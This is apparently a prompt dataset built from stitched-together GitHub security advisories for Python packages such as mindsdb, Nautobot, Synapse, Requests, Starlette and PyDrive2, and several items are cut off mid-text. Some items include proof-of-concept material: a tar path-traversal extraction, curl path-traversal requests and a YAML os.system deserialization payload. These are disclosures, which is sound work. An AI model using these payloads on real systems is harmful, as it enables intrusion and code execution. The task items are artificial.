filenames with two dots \"..\". \n\n\n### PoC\n\nThe following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file `sim4n6.txt` to one of the parent locations rather than the intended current folder.\n\n```bash\n> tar --list -v -f archive.tar.gz\ntar: Removing leading \"../../../\" from member names\n../../../sim4n6.txt\n\n> python3 \nPython 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import tarfile\n>>> with tarfile.open(\"archive.tar.gz\") as tf:\n>>>         tf.extractall()\n>>> exit()\n\n> test -f ../../../sim4n6.txt && echo \"sim4n6.txt exists\"\nsim4n6.txt exists\n```\n\n### Attack Scenario\n\nAn attacker could craft a malicious tarball with a filename path, such as ../../../../../../../../etc/passwd, and then serve the archive remotely, proceed to the PUT request of the tarball through mindsdb and overwrite the system files of the hosting server for instance.\n\n### Mitigation \n\nPotential mitigation could be to:\n - Use a safer module, like `zipfile`.\n - Use an alternative of `tarfile`, such as `tarsafe`. \n  - Validate the location or the absolute path of the extracted files and discard those with malicious paths such as relative path `../../..` or absolute path such as `/etc/password`. A simple wrapper could be written to raise an exception when a path traversal may be identified.\n\nThis is similar to the other report [GHSA-7x45-phmr-9wqp](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp)..

Input: ### Impact\nThis is a vulnerability which affects anyone using Gradio's share links (i.e. creating a Gradio app and then setting `share=True`) with Gradio versions older than 3.13.1. In these older versions of Gradio, a private SSH key is sent to any user that connects to the Gradio machine, which means that a user could access other users' shared Gradio demos. From there, other exploits are possible depending on the level of access/exposure the Gradio app provides. \n\n### Patches\nThe problem has been patched. Ideally, users should upgrade to `gradio==3.19.1` or later where the FRP solution has been properly tested. \n\n### Credit\nCredit to Greg Sadetsky and Samuel Tremblay-Cossette for alerting the team.

The version of OpenSSL included in sgx-dcap-quote-verify-python 0.0.1..0.0.2 is vulnerable to a security issue. More details about the OpenSSL vulnerabilities themselves can be found at https://www.openssl.org/news/secadv/20230207.txt.\n\n## Analysis\nThe binding includes OpenSSL version 1.1.1s which is vulnerable to the vulnerabilities disclosed in [OpenSSL Security Advisory from the 7th February 2023](https://www.openssl.org/news/secadv/20230207.txt).\nThe binding does not directly use OpenSSL. The binding calls the SGX Quote Verification Library which uses OpenSSL.\n\n## Explanation\nThe SGX Quote Verification Library uses OpenSSL as a dependency to perform its cryptographic operations and certificate verification.\n\nThe OpenSSL security advisory mentions multiple vulnerabilities but I believe the most concerning would be CVE-2023-0286 \u201cX.400 address type confusion in X.509 GeneralName\u201d. Its severity is rated high and the advisory states that \u201cthis vulnerability is most likely to only affect applications which have implemented their own functionality for retrieving CRLs over a network.\u201d\n\nRelying on CRLs obtained from an untrusted party is exactly what can happen when verifying a quote. For instance, the vulnerability could be triggered through the \"sgx_qv_verify_quote\" function which can take untrusted quote collateral as input. The quote collateral contains a CRL and certificate chains. The Quote Verification Library uses OpenSSL to verify the validity of those in order to establish the authenticity of the quote. Thus the vulnerability could be exploited with corrupted/forged collateral and quote.\n\n## Impact\n\nAccording to the advisory the \"vulnerability may allow an attacker to pass arbitrary pointers to a memcmp call, enabling them to read memory contents or enact a denial of service\". Transitively I expect the same to be true for the Quote Verification Library.\nThe denial of service impact is not much of a concern I believe since processing forged collateral would most likely stop the software from proceeding normally anyway (forged collateral should be rejected). The part regarding the ability to read memory contents, could result in information disclosure which is a real concern. The quote verification happens on the relying party end, which might use it to check enclave authenticity before providing sensitive data, this vulnerability could therefore result in the leakage of sensitive data.\n.

Who is impacted?_\n\nAll users of Nautobot versions earlier than 1.5.7 are impacted.\n\nIn Nautobot 1.5.7 we have enabled sandboxed environments for the Jinja2 template engine used internally for template rendering for the following objects:\n\n- `extras.ComputedField`\n- `extras.CustomLink`\n- `extras.ExportTemplate` \n- `extras.Secret`\n- `extras.Webhook`\n\nWhile we are not aware of any active exploits, we have made this change as a preventative measure to protect against any potential remote code execution attacks utilizing maliciously crafted template code.\n\nThis change forces the Jinja2 template engine to use a [`SandboxedEnvironment`](https://jinja.palletsprojects.com/en/3.0.x/sandbox/#sandbox) on all new installations of Nautobot.\n\nThis addresses any potential unsafe code execution everywhere the helper function `nautobot.utilities.utils.render_jinja2` is called. Additionally, our documentation that was previously suggesting the direct use of `jinja2.Template` has been revised to utilize `render_jinja2`.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes. Users should upgrade to Nautobot 1.5.7 or newer.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n##### Enabling Sandboxed Environments\n\nFor users that are unable to upgrade to the latest release of Nautobot, you may add the following setting to your `nautobot_config.py` to apply the sandbox environment enforcement:\n\n```python\nTEMPLATES[1][\"OPTIONS\"][\"environment\"] = \"jinja2.sandbox.SandboxedEnvironment\"\n```\n\nAfter applying this change, you must restart all Nautobot services, including any Celery worker processes.\n\n**Note:** *Nautobot specifies two template engines by default, the first being \u201cdjango\u201d for the Django built-in template engine, and the second being \u201cjinja\u201d for the Jinja2 template engine. This recommended setting will update the second item in the list of template engines, which is the Jinja2 engine.*\n\n##### Restricting Jinja2 using Access Controls\n\nFor users that are unable to immediately update their configuration such as if a Nautobot service restart is too disruptive to operations, access to provide custom Jinja2 template values may be mitigated using permissions to restrict \u201cchange\u201d (write) actions to the affected object types listed in the first section.\n\n**Note:** *This solution is intended to be stopgap until you can successfully update your `nautobot_config.py` or upgrade your Nautobot instance to apply the sandboxed environment enforcement.*\n\n#### Updating Existing App or Job Code\n\nFor Nautobot App (formerly plugin) authors or Job authors, additionally we recommend that if you have any custom code that may for example be using `jinaj2.Template` that you no longer use that. Instead, please always use our `nautobot.utilities.utils.render_jinja2` function which will make sure that the centrally-provided Jinja2 template engine with sandboxing enforced is being utilized.\n\nAnywhere you\u2019ve been using this pattern:\n\n```python\nfrom jinja2 import Template\n\nmy_template = Template(template_code)\nconfig = my_template.render(context)\n```\n\nWe recommend that you replace it with this pattern:\n\n```python\nfrom nautobot.utilities.utils import render_jinja2\n    \nconfig = render_jinja2(template_code, context)\n```\n\n### References\n_Are there any links users can visit to find out more?_\n\nPlease see the Nautobot 1.5.7 release notes. \n\nhttps://docs.nautobot.com/projects/core/en/stable/release-notes/version-1.5/#v157-2023-01-04.

While authentication rules prevent the user from making any changes, the error message discloses the display names of user accounts, and by modifying URL parameters, the user can retrieve the display name for any user. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 4.1.9 (LTS), 5.0.5 and 5.1.3.

Please identify the software name affected by it. Input: Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.\n\nThis allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process.

Input: urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.\n\nFrom [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):\n\n> A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.\n\n## Affected usages\n\nBecause the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.\n\nBoth of the following conditions must be true to be affected by this vulnerability:\n\n* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)\n* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.\n\n## Remediation\n\nYou can remediate this vulnerability with any of the following steps:\n\n* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)\n* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.\n* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.\n.

Input: [_Part of the Cure53 security audit of Home Assistant._](https://www.home-assistant.io/blog/2023/10/19/security-audits-of-home-assistant/)\n\nThe audit team\u2019s analyses confirmed that the `redirect_uri` and `client_id` are alterable when logging in. Consequently, the code parameter utilized to fetch the `access_token` post-authentication will be sent to the URL specified in the aforementioned parameters.\n\nSince an arbitrary URL is permitted and `homeassistant.local` represents the preferred, default domain likely used and trusted by many users, an attacker could leverage this weakness to manipulate a user and retrieve account access. Notably, this attack strategy is plausible if the victim has exposed their Home Assistant to the Internet, since after acquiring the victim\u2019s `access_token`, the adversary would need to utilize it directly towards the instance to achieve any pertinent malicious actions.\n\nTo achieve this compromise attempt, the attacker must send a link with a `redirect_uri` that they control to the victim\u2019s own Home Assistant instance. In the eventuality the victim authenticates via the said link, the attacker would obtain code sent to the specified URL in `redirect_uri`, which can then be leveraged to fetch an `access_token`.\n\nAn attacker could increase the efficacy of this strategy by registering a nearly identical domain to `homeassistant.local`, which at first glance may appear legitimate and thereby obfuscate any malicious intentions.\n\nNonetheless, owing to the requirements for victim interaction and Home Assistant instance exposure to the Internet, this severity rating was consequently downgraded to Low..

This may be defined by username or user id. Now, for example, if user id 13 is allowed to run tasks, and an attacker creates a username with username '13', they would be wrongly allowed to run an algorithm.\n\nThere may also be other places in the code where such a mixup of resource ID or name leads to issues.

Second, that a dot in the domain matches any character as part of regex syntax.\n\nTherefore, an allowlist of [\"victim.com\"] could allow the domain \"victimacomattacker.com\" to be requested.\n\nThis has lower impact since the usual attacker aim in an SSRF is to request internal resources such as private IP addresses rather than an attacker's own domain.

Please identify the software name affected by it. Input: ### Impact\nSynapse is an open-source Matrix homeserver written and maintained by the Matrix.org Foundation. The Matrix Federation API allows remote homeservers to request the *authorisation events* of events in a room. This is necessary so that a homeserver receiving some events can validate that those events are legitimate and permitted in their room.\nHowever, in versions of Synapse up to and including 1.68.0, a Synapse homeserver answering a query for authorisation events does not sufficiently check that the requesting server should be able to access them.\n\nAuthorisation events include power level events (the list of user IDs and their power levels at the time) and relevant membership events (including the display name of the sender of that event), as well as events like `m.room.create`, `m.room.third_party_invite` and `m.room.join_rules`. Non-authorisation events are unaffected, so it isn't possible to e.g. extract message contents this way.\n\nThis issue is only exploitable when a malicious actor knows the ID of a target room and the ID of an event from that room. In most cases, this makes exploitation infeasible. This issue is of negligible consequence for public rooms given that any server can easily join the room in order to be allowed to view authorisation events. Further, deployments in a closed federation where all homeservers are trustworthy are not affected.\n\n\n### Patches\n\nThe issue was patched in Synapse 1.69.0. Homeserver administrators are advised to upgrade.\n\n\n### Workarounds\n\nSynapse can be configured with a list of servers that it is allowed to federate with [`federation_domain_whitelist`]. If this list is in use and all the servers on the list are trusted not to exploit this issue, then this issue is of no consequence.\n\nThis workaround is not practical for homeservers participating in open federation as interaction with any server not on the list would have to happen indirectly through servers that are, leading to inconsistent delays in message delivery.\n\n[`federation_domain_whitelist`]: https://matrix-org.github.io/synapse/v1.68/usage/configuration/config_documentation.html#federation_domain_whitelist\n\n### References\n\nFixed in https://github.com/matrix-org/synapse/pull/13823.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory, e-mail us at security@matrix.org..

Please identify the software name affected by it. Input: ### Impact\n\nA malicious user on a Synapse homeserver X with permission to create certain state events can disable outbound federation from X to an arbitrary homeserver Y.\n\nSynapse instances with federation disabled are not affected.\n\n#### Details\n\nThe Matrix protocol allows homeservers to provide an `invite_room_state` field on a [room invite](https://spec.matrix.org/v1.5/client-server-api/#mroommember) containing a [summary of room state](https://spec.matrix.org/v1.5/client-server-api/#stripped-state).  In versions of Synapse up to and including v1.73.0, Synapse did not limit the size of `invite_room_state`, meaning that it was possible to create an arbitrarily large invite event.\n\nAn attacker with an account on a vulnerable Synapse homeserver X could exploit this by having X create an over-sized invite event in a room with a user from another homeserver Y. Once acknowledged by the invitee's homeserver, the invite event would be sent in a batch of events to Y. If the malicious invite is so large that the entire batch is rejected as too large, X's outgoing traffic to Y would become \"stuck\", meaning that messages and state events created by X would remain unseen by Y.\n\n### Patches\n\nSynapse 1.74 refuses to create oversized `invite_room_state` fields. Server operators should upgrade to Synapse 1.74 or newer urgently.\n\n### Workarounds\n\nThere are no robust workarounds.\n\nThis attack needs an account on Synapse homeserver X to deny federation from X to another homeserver Y. As a partial mitigation, Synapse operators can disable open registration to limit the ability of attackers to create new accounts on homeserver X.\n\nIf homeserver X has been attacked in this way, restarting it will resume outgoing federation by entering \"catchup mode\". For catchup mode to ignore the oversized invites, every attacked room must have a correctly-sized event sent by X which is newer than any oversized invite. This is difficult to arrange, and does not prevent the attacker from repeating their attack.\n\n### References\n\n- https://github.com/matrix-org/synapse/issues/14492 was caused by this issue.\n- https://github.com/matrix-org/synapse/issues/14642  includes the patch described above.\n\n### For more information\n\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org)..

Please identify the software name affected by it. Input: ### Impact\n\nThis security advisory lists multiple concerns about how in-toto uses PGP keys. The findings are aggregated here, because they are all eligible to the same mitigation strategy. Note that the findings are rated with different severities (see inline) and the highest score was chosen for this advisory:\n\n- **PGP Key Creation Time Not Validated** (severity: low)\n  in-toto does not check, if the validity period of a PGP Key (starting with the key creation time) is in the future, when copying the key from GnuPG to a layout, or when verifying signatures. A validity period in the future is usually a sign of a wrong system clock, meaning it can\u2019t be trusted for verifying the validity period. A MITM attacker who is able to manipulate delivered software products might also be able to control the system time by manipulating NTP. In a scenario where an attacker gained control over two expired subkeys with no overlapping validity period, the attacker could set the system time to a time before the validity period of either key, resulting in both keys being accepted.\n\n- **PGP Key Revocation Not Considered** (severity: medium)\n in-toto does not check PGP revocation signatures, when copying the key from GnuPG to a layout, or when verifying signatures. This means that a key may still be accepted in signatures, even if it has been revoked in GnuPG.\n\n- **PGP Key Usage Flags Not Considered** (severity: low)\n  in-toto does not check PGP usage flags, when copying the key from GnuPG to a layout, or when verifying signatures. This means that at a key may still be accepted in signatures, even if it is not permitted to sign data as per its key usage flags.\n\n\nSecurity auditors recommend to verify these properties at signature verification time.\n\nHowever, this is not planned, as in-toto does not rely on PGP\u2019s trust model, because it should not be required to consult with a separate PKI/web-of-trust at verification time. Instead the project owner establishes ultimate trust by adding a PGP public key to a layout, and thus is responsible for its validity, and also to revoke the layout, if the key is no longer trusted. The same is true for PGP public keys used to verify a layout.\n\nThe preferred mitigation strategy is to verify these properties when exporting a public key from GnuPG, and to clarify usage documentation that no verification against the PGP trust model is performed afterwards.\n\n### References\n- \"Handle GPG revocation signatures\" -- https://github.com/secure-systems-lab/securesystemslib/issues/190\n- \"inconsistent use of GnuPG\" -- https://github.com/in-toto/in-toto/issues/569\n\n.

Please identify the software name affected by it. Input: ### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP \u2192 HTTPS: **leak**\n2. HTTPS \u2192 HTTP: **no leak**\n3. HTTPS \u2192 HTTPS: **leak**\n4. HTTP \u2192 HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com).

Input: ### Impact\nKiwi TCMS allows users to upload attachments to test plans, test cases, etc. Earlier versions of Kiwi TCMS had introduced upload validators in order to prevent potentially dangerous files from being uploaded, see [GHSA-fwcf-753v-fgcj](https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-fwcf-753v-fgcj) and Content-Security-Policy definition to prevent cross-site-scripting attacks, see [GHSA-2wcr-87wf-cf9j](https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-2wcr-87wf-cf9j).\n\nThe upload validation checks were not robust enough which left the possibility of an attacker to circumvent them and upload a potentially dangerous file. Exploting this flaw a combination of files could be uploaded so that they work together to circumvent the existing Content-Security-Policy and allow execution of arbitrary JavaScript in the browser.\n\n### Patches\n- File upload validation code has been improved\n- Kiwi TCMS will now force `Content-Type: text/plain`  when serving uploaded files\n\n### Workarounds\n\n1) Force the Content-Type header via a custom Django middleware, see `ExtraHeadersMiddleware` in https://github.com/kiwitcms/Kiwi/blob/master/tcms/core/middleware.py#L23 and/or\n2) Force the Content-Type header via Nginx overrides, see `location /uploads/` in https://github.com/kiwitcms/Kiwi/blob/master/etc/nginx.conf\n\n### References\nDisclosed by [Antonio Spataro](https://huntr.dev/bounties/db75275f-8bcd-482b-ae12-feff660d4794) and [ek1ng](https://huntr.dev/bounties/46d5b535-bdff-4b98-8691-a907591fcf10/).

We found in our conversations with in-toto adopters that `in_totorc` is not their preferred way to configure in-toto.

Input: ### Impact\n\nUsers of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).\n\nThis issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.\n\nThe vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.\n\n### Patches\n\nThis vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.\n\n### Workarounds\nIf you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.\n\nIf you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.\n\n### References\n.

Input: ### Summary\nWhen using `StaticFiles`, if there's a file or directory that starts with the same name as the `StaticFiles` directory, that file or directory is also exposed via `StaticFiles` which is a path traversal vulnerability.\n\n### Details\nThe root cause of this issue is the usage of `os.path.commonprefix()`:\nhttps://github.com/encode/starlette/blob/4bab981d9e870f6cee1bd4cd59b87ddaf355b2dc/starlette/staticfiles.py#L172-L174\n\nAs stated in the Python documentation (https://docs.python.org/3/library/os.path.html#os.path.commonprefix) this function returns the longest prefix common to paths.\n\nWhen passing a path like `/static/../static1.txt`, `os.path.commonprefix([full_path, directory])` returns `./static` which is the common part of `./static1.txt` and `./static`, It refers to `/static/../static1.txt` because it is considered in the staticfiles directory. As a result, it becomes possible to view files that should not be open to the public.\n\nThe solution is to use `os.path.commonpath` as the Python documentation explains that `os.path.commonprefix` works a character at a time, it does not treat the arguments as paths.\n\n### PoC\nIn order to reproduce the issue, you need to create the following structure:\n\n```\n\u251c\u2500\u2500 static\n\u2502   \u251c\u2500\u2500 index.html\n\u251c\u2500\u2500 static_disallow\n\u2502   \u251c\u2500\u2500 index.html\n\u2514\u2500\u2500 static1.txt\n```\n\nAnd run the `Starlette` app with:\n\n```py\nimport uvicorn\nfrom starlette.applications import Starlette\nfrom starlette.routing import Mount\nfrom starlette.staticfiles import StaticFiles\n\n\nroutes = [\n    Mount(\"/static\", app=StaticFiles(directory=\"static\", html=True), name=\"static\"),\n]\n\napp = Starlette(routes=routes)\n\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n```\n\nAnd running the commands:\n\n```shell\ncurl --path-as-is 'localhost:8000/static/../static_disallow/'\ncurl --path-as-is 'localhost:8000/static/../static1.txt'\n```\nThe `static1.txt` and the directory `static_disallow` are exposed.\n\n### Impact\nConfidentiality is breached: An attacker may obtain files that should not be open to the public.\n\n### Credits\nSecurity researcher **Masashi Yamane of LAC Co., Ltd** reported this vulnerability to **JPCERT/CC Vulnerability Coordination Group** and they contacted us to coordinate a patch for the security issue.\n.

Object-level permissions (i.e., does the user have permission to run this *specific* Job?) are not enforced by the URL/view used in this case (`/extras/job-button/<uuid>/run/`) The effect is that a user with permissions to run even a single Job can actually run all configured JobButton Jobs.\n\n> Not all Jobs can be configured as JobButtons; only those implemented as subclasses of `JobButtonReceiver` can be used in this way, so this vulnerability only applies specifically to `JobButtonReceiver` subclasses.\n\nAdditionally, although the documentation states that both `extras.run_job` permission and `extras.run_jobbutton` permission must be granted to a user in order to run Jobs via JobButton, the `extras.run_jobbutton` permission is not actually enforced by the view code, only by the UI by disabling the button from being clicked normally. Furthermore, the `extras.run_jobbutton` permission never prevented invoking Jobs (including `JobButtonReceiver` subclasses) via the normal \"Job Run\" UI, so after some discussion, we've decided that the `extras.run_jobbutton` permission is redundant, and as it never achieved its stated/documented purpose, the fixes below will remove the UI check for `extras.run_jobbutton` and all other references to the `extras.run_jobbutton` permission, rather than adding enforcement of this previously unenforced permission.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nFix will be available in Nautobot 1.6.8 (https://github.com/nautobot/nautobot/pull/4995) and 2.1.0 (https://github.com/nautobot/nautobot/pull/4993)\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nPartial mitigation can be achieved by auditing `JobButtonReceiver` subclasses defined in the system and restricting which users are permitted to create or edit JobButton records. \n\n### References\n\n- https://github.com/nautobot/nautobot/issues/4988\n- https://github.com/nautobot/nautobot/pull/4993\n- https://github.com/nautobot/nautobot/pull/4995\n.

Please identify the software name affected by it. Input: ### Summary\n\nAsyncSSH v2.14.1 and earlier is vulnerable to a novel prefix truncation attack (a.k.a. Terrapin attack), which allows a man-in-the-middle attacker to strip an arbitrary number of messages right after the initial key exchange, breaking SSH extension negotiation (RFC8308) in the process and thus downgrading connection security.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes. Support for strict key exchange has been added to AsyncSSH in the patched version. \n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (`chacha20-poly1305@openssh.com`) and Encrypt-then-MAC (`*-etm@openssh.com` MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details and a pre-print of the associated research paper, see [https://terrapin-attack.com](https://terrapin-attack.com).

These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported.

A maliciously crafted YAML file can cause arbitrary code execution if PyDrive2 is run in the same directory as it, or if it is loaded in via `LoadSettingsFile`.\n\n### Details\nThe loader being imported from the `yaml` library is `CLoader`: https://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L5\n\nThis loader is then used to load a user supplied file: https://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L108-L121\n\nCLoader is considered unsafe. It will allow any Python code inside of it to be executed. This loading behaviour also happens automatically, the file only needs to be present for this vulnerability to occur.\n\nhttps://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L9\n\nReference: https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf\n\n### PoC\n1. Create a malicious `settings.yaml` file:\n\n```yaml\n!!python/object/new:os.system [echo poc]\n```\n2. Initialize a `GoogleAuth` object .\n```python\nfrom pydrive2.auth import GoogleAuth\n\ngauth = GoogleAuth()\n```\n3. Execute the code with the settings file present in your directory. The code inside the file will be executed:\n```\n[evan@ejedev PyDrive2]$ ls\nCHANGES  client_secrets.json  CONTRIBUTING.rst  docs  examples  LICENSE  main.py  MANIFEST.in  pydrive2  pyproject.toml  pytest.ini  README.rst  settings.yaml  setup.py  tox.ini\n[evan@ejedev PyDrive2]$ cat settings.yaml\n!!python/object/new:os.system [echo poc]\n[evan@ejedev PyDrive2]$ cat main.py \nfrom pydrive2.auth import GoogleAuth\n\n\ngauth = GoogleAuth()\n[evan@ejedev PyDrive2]$ python3 main.py \npoc\n```\nAlternatively, the file can be loaded in directly via `pydrive2.settings.LoadSettingsFile` \n\n### Impact\nThis is a deserilization attack that will affect any user who initializes GoogleAuth from this package while a malicious `yaml` file is present in the same directory. As it does not require it to be directly loaded through the code, only present, I believe this produces an extra element of risk. . Top 1 search result is pypi:PyDrive2.

Input: ### Impact\nIn versions of the proxy from `2022-09-05` onwards (since 8c874c2ff3d503ac20c7d32f46e08547fcb9e23f), expired OAuth 2.0 client credentials grant (CCG) flow authorisation tokens could be renewed automatically without checking their validity against the original account configuration (i.e., the password that was set up when first creating an account in the proxy).\n\nAn attacker with knowledge of valid account addresses and careful timing (specifically, attempting to log in during a period from 10 minutes prior to the token expiry time, but before a genuine login request is received) could use this issue to gain access to an account.\n\nThis issue is only a security concern if you use the proxy with the CCG flow and no additional account secret encryption (see below). If this is the case, it is particularly important to update if you use the proxy in a publicly-accessible setting (i.e., it is available from the internet or across a network). To fix the issue you should switch to version [`2023-12-19`](https://github.com/simonrob/email-oauth2-proxy/releases/tag/2023-12-19) or later of the proxy immediately.\n\nIf you use this flow, but have also set `encrypt_client_secret_on_first_use = True` *and* removed the original `client_secret` value from the proxy's configuration file then this issue is not a concern.\n\nFor all other use-cases (e.g., a normal interactive account authentication, or the ROPCG flow), this issue is also not a concern. However, it is always recommended as best practice to keep the proxy up-to-date.\n\n\n### Patches\n[Email OAuth 2.0 Proxy version `2023-12-19`](https://github.com/simonrob/email-oauth2-proxy/releases/tag/2023-12-19) (commit eaaa1a2e7a132bf0958dd2f99a749ad98e3212aa) fixes this issue.\n\n\n### Issue details\nBecause it was originally designed for use as an interactive, local-only service on a single device, the proxy automatically resets account access tokens if incorrect IMAP/POP/SMTP login details are provided. For public-facing deployments, the `delete_account_token_on_password_error` option is provided, and can be set to `False` to disable this behaviour, which would normally be only a nuisance, rather than a security risk.\n\nRegardless of this option's value, the proxy encrypts locally-stored tokens, and requires interactive re-authentication (or, with the resource owner 